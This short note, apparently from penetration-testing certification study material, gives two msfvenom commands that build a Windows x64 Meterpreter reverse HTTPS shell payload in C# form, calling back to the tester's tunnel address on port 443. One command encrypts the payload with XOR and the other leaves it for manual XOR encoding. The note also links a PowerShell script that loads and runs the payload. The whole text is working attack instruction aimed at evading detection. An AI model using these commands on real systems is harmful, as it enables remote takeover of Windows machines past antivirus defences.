Either use: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp` and ecnrypt manually using xor encrypting function (like in simple shellcode runner),
or use `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a` and decrypt like in process hollowing code.
To run the CSharp payload using Powershell, use https://github.com/ofirsw/OSEP/blob/main/Execution/Invoke-XorReflection.ps1
